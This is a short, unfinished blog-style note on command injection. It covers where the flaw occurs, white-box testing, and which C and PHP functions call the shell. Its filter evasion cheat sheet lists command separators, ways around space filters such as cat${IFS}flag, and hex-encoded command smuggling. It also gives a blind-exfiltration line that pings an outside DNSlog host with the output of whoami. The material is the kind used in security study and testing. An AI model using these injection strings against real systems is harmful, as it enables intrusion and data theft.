---
title: Command Injection
date: 2018-09-25 00:11:27
tags: shell
categories: Injection
---

## Common occurrences of vulnerabilities
It often occurs when unsafe data is passed to a system shell.

## Use of Vulnerabilities
**List directory**

**Get file content**

**Get reverse shell**

## Testing of Command Injection
**white Box Testing**
We focus particularly on the function that calls system shell. And 
we try to add a semicolon(or '|', '&&' and so on) and another command 
to the input parameter, then we can observe result whether the command 
that we injected has been executed.
<!--more-->

* C
system
exectl

* php
system
exec
shell_exec
passthru
popen
proc_open
pcntl_exec

## Command Injection Filter Evasion Cheat Sheet
**Separator**
* |
* ||
* ;
* &
* &&

**No space**
* cat<flag
* cat${IFS}flag
* cat$IFS"flag"
* cat	flag(Tab)

**Filter special characters**
* $(printf$IFS"\x77\x68\x6f\x61\x6d\x69")

**No visual output**
* ping \`whoami\`.rg1ido.ceye.io

Use DNSlog to receive data

# To be continue